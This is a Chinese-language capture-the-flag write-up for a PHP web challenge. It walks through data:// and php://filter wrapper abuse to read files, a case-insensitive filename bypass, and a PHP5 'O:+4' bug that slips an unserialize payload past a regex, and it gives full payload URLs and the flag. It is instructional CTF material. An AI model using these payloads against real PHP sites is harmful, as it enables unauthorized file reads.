## easy unserialize

这题主要就是让大家了解一下文件包含和反序列化，但是似乎太简单了，所以加一个php5时代的古早漏洞，随便搜一搜都是铺天盖地的文章。看到不少同学通过这道题重拾对Web的信心我还是很欣慰的（￣︶￣）↗　

首页的注释里包含了index.php的源码：

```php
<?php
error_reporting(0);
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="I'm admin")){  
    echo "hello admin!<br>";  
    if(preg_match("/f1a9/",$file)){  
        die('Stop hacking!');
    }
    include($file); //try to read class.php
    
    if(preg_match('/O:\d:/i', $pass)) { 
    	die('I told you to stop hacking!');
    }
    echo unserialize($pass);
      
}else{  
    echo "you are not admin ! ";  
}  

?> 
```

逻辑很简单，GET方式获取"user"、"file"、"pass"三个参数，首先需要满足file_get_contents($user,'r')==="I'm admin"，可以通过php伪协议data://实现。

```
user=data://text/plain,I'm admin
```

文件包含这里可以通过php伪协议php://filter读取任意文件，源码中提示读取class.php，注意这里要base64编码，否则会被作为php代码执行。

```
user=data://text/plain,I'm admin&file=php://filter/read=convert.base64-encode/resource=class.php
```

class.php：

```php
<?php

//flag in f1a9.php
class Read{
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}
?>
```

Read类实现了读取文件的功能，配合index.php的反序列化可以实现任意文件读，源码中提示flag在f1a9.php中，因此反序列化读取f1a9.php即可。

有同学可能会问，上一步的文件包含已经实现任意文件读了呀，为什么不能在上一步读取f1a9.php呢？想法非常好，可惜出题人早就料到你的骚操作了，看到下面这句代码了没，直接die()送你回家^_^

```
if(preg_match("/f1a9/",$file)){  
    die('Stop hacking!');
}
```

当然了，不要气馁，其实这里也有一点小问题，我的正则表达式写的是"/f1a9/"，没有声明大小写不敏感("/f1a9/i")，在linux这种文件大小写敏感的系统中没有问题，但如果运行在Windows这种文件大小写不敏感的系统中，我们是可以通过大小写绕过的：

```
user=data://text/plain,I'm admin&file=php://filter/read=convert.base64-encode/resource=F1a9.php
```

同学们可以在Windows中使用`php -S 127.0.0.1:80`临时搭建php服务实验一下，亲测可用。

由于题目服务器环境为linux，解题的时候这种方法并不可行，但并不意味着该漏洞不存在。许多题目的解法并不唯一，非预期解也是解法的一种，一些严重的漏洞也都是从刁钻的角度被挖出来的，希望大家在以后的比赛和研究中多多思考，灵活的思维才更容易产出高质量的成果。

回归正题，我们使用反序列化读取f1a9.php：

```php
<?php
 
class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}

$o=new Read();
$o->file="f1a9.php";
print(serialize($o));
?>
```

Payload:

```
user=data://text/plain,I'm admin&file=class.php&pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

但这里有个问题，源码中存在对"/O:\d:/i"的正则检测：

```
if(preg_match('/O:\d:/i', $pass)) { 
	die('I told you to stop hacking!');
}
```

这里可以参考https://www.phpbug.cn/archives/32.html，PHP5中存在一个小bug，将O:4改为O:+4即可绕过检测，并且可以正常反序列化。

Payload改为：

```
user=data://text/plain,I'm admin&file=class.php&pass=O:+4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

最终Payload：

```
http://10.212.27.23:8085/?user=data://text/plain,I%27m%20admin&file=class.php&pass=O:%2b4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;}
```

如果在浏览器中访问，则需要查看源代码才能看到flag，因为php文件由<?php开头，而浏览器中尖括号包裹的部分会被解析为标签，尽管无法正常解析为html，但也不会显示给用户。

### flag

flag{00b74ef6-c1a4-4e24-9e3c-67072b20e797}

